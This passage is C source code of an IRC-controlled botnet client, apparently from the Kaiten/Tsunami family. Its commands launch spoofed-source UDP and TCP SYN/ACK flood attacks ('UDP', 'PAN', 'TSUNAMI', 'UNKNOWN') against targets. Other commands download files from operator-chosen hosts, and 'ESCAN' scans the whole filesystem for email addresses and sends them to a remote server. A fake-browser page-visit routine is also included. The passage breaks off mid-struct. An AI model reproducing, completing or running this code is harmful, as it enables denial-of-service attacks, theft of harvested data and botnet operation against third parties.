int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((datalen=read(inst->sock,buf,len)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	if (datalen == 0 && len) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_listen(struct ainst *inst,unsigned int port) {
	int flag=1;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	inst->in.sin_family = AF_INET;
	inst->in.sin_addr.s_addr = INADDR_ANY;
	inst->in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_setup(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return audp_send(inst,textBuffer,a);
}

int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {
	long datalen,nlen;
	if (inst == NULL) return (AINSTANCE);
	nlen=sizeof(inst->in);
	inst->len=0;
	memcpy((void*)client,(void*)inst,sizeof(struct ainst));
	if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(socklen_t*)&nlen)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int sock;
char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
char *servers[256];
unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
		static char textBuffer[1024];
		va_list args;
		va_start(args, words);
		vsprintf(textBuffer, words, args);
		va_end(args);
		return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
int isvowel(char a) {
	if (a == 'a' || a == 'e' || a == 'i' || a == 'o' || a == 'u') return 1;
	if (a == 'A' || a == 'E' || a == 'I' || a == 'O' || a == 'U') return 1;
	return 0;
}
char *makestring(int cautious) {
	char *tmp;
	int len=(rand()%5)+4,i,sequence=rand()%15,h=(rand()%2)+1;
	FILE *file;
	tmp=(char*)malloc(len+1);
	memset(tmp,0,len+1);
	for (i=0;i<len;i++) {
		if (i == 0) {
			tmp[i]=(rand()%(91-65))+65;
			while(isvowel(tmp[i])) tmp[i]=(rand()%(91-65))+65;
		}
		if (i >= 1) {
			if (isvowel(tmp[i-1])) {
				tmp[i]=(rand()%(91-65))+65;
				while(isvowel(tmp[i])) tmp[i]=(rand()%(91-65))+65;
			}
			else {
				tmp[i]=(rand()%(91-65))+65;
				while(!isvowel(tmp[i])) tmp[i]=(rand()%(91-65))+65;
			}
		}
		if (cautious) sequence = 0;
		if (sequence >= 0 && sequence < 5) tmp[i]=tolower(tmp[i]);
		else if (sequence >= 5 && sequence < 10) {
			tmp[i]=tolower(tmp[i]);
			if (i > 0 && isvowel(tmp[i])) sequence=69;
		}
		else if (sequence >= 10 && sequence < 14) if (i > 0) tmp[i]=tolower(tmp[i]);
		else if (sequence == 14) if (i%2) tmp[i]=tolower(tmp[i]);
	}
	return tmp;
}
void identd() {
	int sockfd,sin_size,tmpsock,i;
	struct sockaddr_in my_addr,their_addr;
	char szBuffer[1024];
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = htons(113);
	my_addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(my_addr.sin_zero), 0, 8);
	if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
	if (listen(sockfd, 1) == -1) return;
	if (fork() != 0) return;
	sin_size = sizeof(struct sockaddr_in);
	if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
	for(;;) {
		fd_set bla;
		struct timeval timee;
		FD_ZERO(&bla);
		FD_SET(tmpsock,&bla);
		timee.tv_sec=timee.tv_usec=60;
		if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
		if (FD_ISSET(tmpsock,&bla)) break;
	}
	i = recv(tmpsock,szBuffer,1024,0);
	if (i <= 0 || i >= 20) exit(0);
	szBuffer[i]=0;
	if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
	if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
	close(tmpsock);
	close(sockfd);
	exit(0);
}
long pow(long a, long b) {
	if (b == 0) return 1;
	if (b == 1) return a;
	return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer =0;
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
	int sock2,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	char buf[1024];
	FILE *file;
	unsigned char bufm[4096];
	if (mfork(sender) != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :GET <host> <save as>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
		exit(0);
	}
	if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
	else strcpy(buf,argv[1]);
	for (i=0;i<strlen(buf) && buf[i] != '/';i++);
	buf[i]=0;
	server.sin_family = AF_INET;
	server.sin_port = htons(80);
	if ((ipaddr = inet_addr(buf)) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(buf)) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
		exit(0);
	}

	Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
	Send(sock,"NOTICE %s :Receiving file.\n",sender);
	file=fopen(argv[2],"wb");
	while(1) {
		int i;
		if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
		if (i < 4096) bufm[i]=0;
		for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
			for (d+=4;d<i;d++) fputc(bufm[d],file);
			goto done;
		}
	}
	done:
	Send(sock,"NOTICE %s :Saved as %s\n",sender,argv[2]);
	while(1) {
		int i,d;
		if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
		if (i < 4096) bufm[i]=0;
		for (d=0;d<i;d++) fputc(bufm[d],file);
	}
	fclose(file);
	close(sock2);
	exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
	unsigned long a=spoofs,b=spoofs+(spoofsm-1);
	if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
	else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
	Send(sock,"NOTICE %s :Voyager Alpha Force: Goraku\n",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
	if (argc != 1) {
		Send(sock,"NOTICE %s :NICK <nick>\n",sender);
		return;
	}
	if (strlen(argv[1]) >= 10) {
		Send(sock,"NOTICE %s :Nick cannot be larger than 9 characters.\n",sender);
		return;
	}
	nick=strdup(argv[1]);
	Send(sock,"NICK %s\n",nick);
}
void disable(int sock, char *sender, int argc, char **argv) {
	if (argc != 1) {
		Send(sock,"NOTICE %s :DISABLE <pass>\n",sender);
		Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
		return;
	}
	if (disabled) {
		Send(sock,"NOTICE %s :Already disabled.\n",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {
		Send(sock,"NOTICE %s :Password too long! > 254\n",sender);
		return;
	}
	disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,"NOTICE %s :Disable sucessful.\n",sender);
}
void enable(int sock, char *sender, int argc, char **argv) {
	if (argc != 1) {
		Send(sock,"NOTICE %s :ENABLE <pass>\n",sender);
		Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
		return;
	}
	if (!disabled) {
		Send(sock,"NOTICE %s :Already enabled.\n",sender);
		return;
	}
	if (strcmp(dispass,argv[1])) {
		Send(sock,"NOTICE %s :Wrong password\n",sender);
		return;
	}
	disabled=0;
	Send(sock,"NOTICE %s :Password correct.\n",sender);
}
void spoof(int sock, char *sender, int argc, char **argv) {
	char ip[256];
	int i, num;
	unsigned long uip;
	if (argc != 1) {
		Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
		spoofs=0;
		spoofsm=0;
		return;
	}
	if (strlen(argv[1]) > 16) {
		Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
		return;
	}
	strcpy(ip,argv[1]);
	if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
	for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
	num=-(num-4);
	for (i=0;i<num;i++) strcat(ip,".0");
	uip=inet_network(ip);
	if (num == 0) spoofsm=1;
	else spoofsm=pow(256,num);
	spoofs=uip;
}
struct iphdr {
	unsigned int ihl:4, version:4;
	unsigned char tos;
	unsigned short tot_len;
	unsigned short id;
	unsigned short frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short check;
	unsigned long saddr;
	unsigned long daddr;
};
struct udphdr {
	unsigned short source;
	unsigned short dest;
	unsigned short len;
	unsigned short check;
};
struct tcphdr {
	unsigned short source;
	unsigned short dest;
	unsigned long seq;
	unsigned long ack_seq;
	unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
	unsigned short window;
	unsigned short check;
	unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	if((i.s_addr = inet_addr(hostname)) == -1) {
		if((h = gethostbyname(hostname)) == NULL) {
			return 0;
		}
		bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
	}
	return i.s_addr;
}
void udp(int sock, char *sender, int argc, char **argv) {
	unsigned int secs,port,i=0;
	unsigned long psize,target;
	struct sockaddr_in s_in;
	struct iphdr *ip;
	struct udphdr *udp;
	char buf[1500],*str;
	int get;
	time_t start=time(NULL);
	if (mfork(sender) != 0) return;
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	if (argc < 3) {
		Send(sock,"NOTICE %s :UDP <target> <port> <secs>\n",sender);
		exit(1);
	}
	target = host2ip(argv[1]);
	port = atoi(argv[2]);
	secs = atoi(argv[3]);
	ip=(void*)buf;
	udp=(void*)(buf+sizeof(struct iphdr));
	str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
	memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
	Send(sock,"NOTICE %s :Packeting %s.\n",sender,argv[1]);
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = 1500;
	ip->frag_off = 0;
	ip->protocol = 17;
	ip->ttl = 64;
	ip->daddr = target;
	udp->len = htons(psize);
	s_in.sin_family  = AF_INET;
	s_in.sin_addr.s_addr = target;
	for (;;) {
		udp->source = rand();
		if (port) udp->dest = htons(port);
		else udp->dest = rand();
		udp->check = in_cksum((u_short *)buf,1500);
		ip->saddr = getspoof();
		ip->id = rand();
		ip->check = in_cksum((u_short *)buf,1500);
		s_in.sin_port = udp->dest;
		sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
		if (i >= 50) {
			if (time(NULL) >= start+secs) exit(0);
			i=0;
		}
		i++;
	}
}
void pan(int sock, char *sender, int argc, char **argv) {
	struct send_tcp send_tcp;
	struct pseudo_header pseudo_header;
	struct sockaddr_in sin;
	unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
	unsigned int psize=20, source, dest, check;
	unsigned long saddr, daddr,secs;
	int get;
	time_t start=time(NULL);
	if (mfork(sender) != 0) return;
	if (argc < 3) {
		Send(sock,"NOTICE %s :PAN <target> <port> <secs>\n",sender);
		exit(1);
	}
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	{int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
	daddr=host2ip(argv[1]);
	secs=atol(argv[3]);
	Send(sock,"NOTICE %s :Panning %s.\n",sender,argv[1]);
	send_tcp.ip.ihl = 5;
	send_tcp.ip.version = 4;
	send_tcp.ip.tos = 16;
	send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 64;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.ack_seq = 0;
	send_tcp.tcp.doff = 10;
	send_tcp.tcp.res1 = 0;
	send_tcp.tcp.cwr = 0;
	send_tcp.tcp.ece = 0;
	send_tcp.tcp.urg = 0;
	send_tcp.tcp.ack = 0;
	send_tcp.tcp.psh = 0;
	send_tcp.tcp.rst = 0;
	send_tcp.tcp.fin = 0;
	send_tcp.tcp.syn = 1;
	send_tcp.tcp.window = 30845;
	send_tcp.tcp.urg_ptr = 0;
	dest=htons(atoi(argv[2]));
	while(1) {
		source=rand();
		if (atoi(argv[2]) == 0) dest=rand();
		saddr=getspoof();
		send_tcp.ip.tot_len = htons(40+psize);
		send_tcp.ip.id = rand();
		send_tcp.ip.saddr = saddr;
		send_tcp.ip.daddr = daddr;
		send_tcp.ip.check = 0;
		send_tcp.tcp.source = source;
		send_tcp.tcp.dest = dest;
		send_tcp.tcp.seq = rand();
		send_tcp.tcp.check = 0;
		sin.sin_family = AF_INET;
		sin.sin_port = dest;
		sin.sin_addr.s_addr = send_tcp.ip.daddr;
		send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
		check = rand();
		send_tcp.buf[9]=((char*)&check)[0];
		send_tcp.buf[10]=((char*)&check)[1];
		send_tcp.buf[11]=((char*)&check)[2];
		send_tcp.buf[12]=((char*)&check)[3];
		pseudo_header.source_address = send_tcp.ip.saddr;
		pseudo_header.dest_address = send_tcp.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20+psize);
		bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
		bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
		sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
		if (a >= 50) {
			if (time(NULL) >= start+secs) exit(0);
			a=0;
		}
		a++;
	}
	close(get);
	exit(0);
}
void tsunami(int sock, char *sender, int argc, char **argv) {
	struct send_tcp send_tcp;
	struct pseudo_header pseudo_header;
	struct sockaddr_in sin;
	unsigned int psize=1400, check,i,secs;
	unsigned long saddr, daddr;
	int get;
	time_t start=time(NULL);
	if (mfork(sender) != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :TSUNAMI <target> <secs>\n",sender);
		exit(1);
	}
	secs=atoi(argv[2]);
	if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
	srand(time(NULL) ^ getpid());
	memset(send_tcp.buf,rand(),psize);
	daddr=host2ip(argv[1]);
	Send(sock,"NOTICE %s :Tsunami heading for %s.\n",sender,argv[1]);
	while(1) {
		saddr=getspoof();
		send_tcp.ip.ihl = 5;
		send_tcp.ip.version = 4;
		send_tcp.ip.tos = 16;
		send_tcp.ip.tot_len = htons(40+psize);
		send_tcp.ip.id = rand();
		send_tcp.ip.frag_off = 64;
		send_tcp.ip.ttl = 64;
		send_tcp.ip.protocol = 6;
		send_tcp.ip.check = 0;
		send_tcp.ip.saddr = saddr;
		send_tcp.ip.daddr = daddr;
		send_tcp.tcp.source = rand();
		send_tcp.tcp.dest = rand();
		send_tcp.tcp.seq = rand();
		send_tcp.tcp.ack_seq = rand();
		send_tcp.tcp.doff = 5;
		send_tcp.tcp.res1 = 0;
		send_tcp.tcp.cwr = 0;
		send_tcp.tcp.ece = 0;
		send_tcp.tcp.urg = 0;
		send_tcp.tcp.ack = 1;
		send_tcp.tcp.psh = 1;
		send_tcp.tcp.rst = 0;
		send_tcp.tcp.fin = 0;
		send_tcp.tcp.syn = 0;
		send_tcp.tcp.window = 30845;
		send_tcp.tcp.check = 0;
		send_tcp.tcp.urg_ptr = 0;
		sin.sin_family = AF_INET;
		sin.sin_port = send_tcp.tcp.dest;
		sin.sin_addr.s_addr = send_tcp.ip.daddr;
		send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
		check = in_cksum((unsigned short *)&send_tcp, 40);
		pseudo_header.source_address = send_tcp.ip.saddr;
		pseudo_header.dest_address = send_tcp.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20+psize);
		bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
		bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
		send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
		sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
		if (i >= 50) {
			if (time(NULL) >= start+secs) break;
			i=0;
		}
		i++;
	}
	close(get);
	exit(0);
}
void unknown(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i,secs;
	char *buf=(char*)malloc(9216);
	struct sockaddr_in in;
	time_t start=time(NULL);
	if (mfork(sender) != 0) return;
	if (argc < 2) {
			Send(sock,"NOTICE %s :UNKNOWN <target> <secs>\n",sender);
			exit(1);
	}
	secs=atoi(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(argv[1]);
	in.sin_family = AF_INET;
	Send(sock,"NOTICE %s :Unknowning %s.\n",sender,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
		if (i >= 50) {
			if (time(NULL) >= start+secs) break;
			i=0;
		}
		i++;
	}
	close(fd);
	exit(0);
}

int isgood(char a) {
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	if (a >= '0' && a <= '9') return 1;
	if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
	return 0;
}

int islisten(char a) {
	if (a == '.') return 1;
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	return 0;
}

struct _linklist {
	char *name;
	struct _linklist *next;
} *linklist=NULL;

void AddToList(char *str) {
	struct _linklist *getb=linklist,*newb;
	while(getb != NULL) {
		if (!strcmp(str,getb->name)) return;
		getb=getb->next;
	}
	newb=(struct _linklist *)malloc(sizeof(struct _linklist));
	newb->name=strdup(str);
	newb->next=linklist;
	linklist=newb;
}

void ScanFile(char *f) {
	FILE *file=fopen(f,"r");
	unsigned long startpos=0;
	if (file == NULL) return;
	while(1) {
		char buf[2];
		memset(buf,0,2);
		fseek(file,startpos,SEEK_SET);
		fread(buf,1,1,file);
		startpos++;
		if (feof(file)) break;
		if (*buf == '@') {
			char email[256],c,d;
			unsigned long pos=0;
			while(1) {
				unsigned long oldpos=ftell(file);
				fseek(file,-1,SEEK_CUR);
				c=fgetc(file);
				if (!isgood(c)) break;
				fseek(file,-1,SEEK_CUR);
				if (oldpos == ftell(file)) break;
			}
			for (pos=0,c=0,d=0;pos<255;pos++) {
				email[pos]=fgetc(file);
				if (email[pos] == '.') c++;
				if (email[pos] == '@') d++;
				if (!isgood(email[pos])) break;
			}
			email[pos]=0;
			if (c == 0 || d != 1) continue;
			if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
			if (*email == '@' || *email == '.' || !*email) continue;
			if (!strcmp(email,"webmaster@mydomain.com")) continue;
			for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
			if (c == 0) continue;
			if (!strncmp(email+c,".hlp",4)) continue;
			if (!strncmp(email+c,".gov",4)) continue;
			for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
			if (d == 1) continue;
			AddToList(email);
		}
	}
	fclose(file);
}

void StartScan() {
	FILE *f;
	f=popen("find / -type f","r");
	if (f == NULL) return;
	while(1) {
		char fullfile[MAXPATH];
		memset(fullfile,0,MAXPATH);
		fgets(fullfile,MAXPATH,f);
		if (feof(f)) break;
		while(fullfile[strlen(fullfile)-1]=='\n' ||
			fullfile[strlen(fullfile)-1] == '\r')
			fullfile[strlen(fullfile)-1]=0;
		if (!strncmp(fullfile,"/proc",5)) continue;
		if (!strncmp(fullfile,"/dev",4)) continue;
		if (!strncmp(fullfile,"/bin",4)) continue;
		ScanFile(fullfile);
	}
}

void escan(int sock, char *sender, int argc, char **argv) {
	struct _linklist *getb;
	struct ainst client;
	if (argc < 1) {
		Send(sock,"NOTICE %s :ESCAN <server>\n",sender);
		return;
	}
	if (mfork(sender) != 0) return;
	StartScan();
	audp_setup(&client,argv[1],ESCANPORT);
	getb=linklist;
	while(getb != NULL) {
		unsigned long len=strlen(getb->name);
		audp_send(&client,getb->name,len);
		getb=getb->next;
	}
	audp_close(&client);
	exit(0);
}

void ViewWebsite(char *http,char *cookie) {
	char *server,additional[256], cookies[1024], location[1024];
	unsigned long j,i;
	struct ainst up;
	char num=0;
	if (!strncmp(http,"http://",7)) server=http+7;
	else server=http;
	for (i=0;i<strlen(server);i++) if (server[i] == '/') {
		server[i]=0;
		num+=1;
		break;
	}
	memset(additional,0,256);
	if (cookie) {
		for (j=0;j<strlen(cookie);j++) if (cookie[j] == ';') {
			cookie[j]=0;
			break;
		}
		sprintf(additional,"Cookie2: $Version=\"1\"\r\nCookie: %s\r\n",cookie);
	}
	if (atcp_connect(&up,server,80) != 0) return;
	if (rand()%2) {
		atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n%s\r\n",server+i+num,server,additional);
	}
	else {
		atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nHost: %s\r\nAccept: text/html, text/plain, text/sgml, */*;q=0.01\r\nAccept-Encoding: gzip, compress\r\nAccept-Language: en\r\nUser-Agent: Lynx/2.8.4rel.1 libwww-FM/2.14\r\n%s\r\n",server+i+num,server,additional);
	}
	memset(cookies,0,1024);
	memset(location,0,1024);
	while(1) {
		fd_set n;
		struct timeval tv;
		FD_ZERO(&n);
		FD_SET(up.sock,&n);
		tv.tv_sec=60*20;
		tv.tv_usec=0;
		if (select(up.sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) break;
		if (FD_ISSET(up.sock,&n)) {
			char buf[4096], *str;
			unsigned long code,i;
			if ((i=recv(up.sock,buf,4096,0)) <= 0) break;
			buf[i]=0;
			str=strtok(buf,"\n");
			while(str && *str) {
				char name[1024], params[1024];
				while(str[strlen(str)-1] == '\r' || str[strlen(str)-1] == '\n') str[strlen(str)-1] = 0;
				for (i=0;i<strlen(str);i++) if (str[i] == ':' || str[i] == '/') break;
				str[i]=0;
				if (strlen(str) < 1024) {
					strcpy(name,str);
					if (strlen(str+i+1) < 1024) {
						if (str[i+1] == ' ') strcpy(params,str+i+2);
						else strcpy(params,str+i+1);
						if (!strcmp(name,"HTTP")) code=atoi(params);
						else if (!strcmp(name,"Set-Cookie")) strcpy(cookies,params);
						else if (!strcmp(name,"Location")) strcpy(location,params);
					}
				}
				str=strtok((char*)NULL,"\n");
			}
			if (*location) {
				char *a=strdup(location),*b=strdup(cookies);
				ViewWebsite(a,b);
				FREE(a);
				FREE(b);
			}
		}
	}
}
void website(int sock, char *sender, int argc, char **argv) {
	if (argc < 1) {
		Send(sock,"NOTICE %s :WEBSITE <url>\n",sender);
		exit(1);
	}
	if (mfork(sender) != 0) return;
	ViewWebsite(argv[1],NULL);
	exit(0);
}
struct dns {
	unsigned short int id;
	unsigned char  rd:1;
	unsigned char  tc:1;
	unsigned char  aa:1;
	unsigned char  opcode:4;
	unsigned char  qr:1;
	unsigned char  rcode:4;
	unsigned char  unused:2;
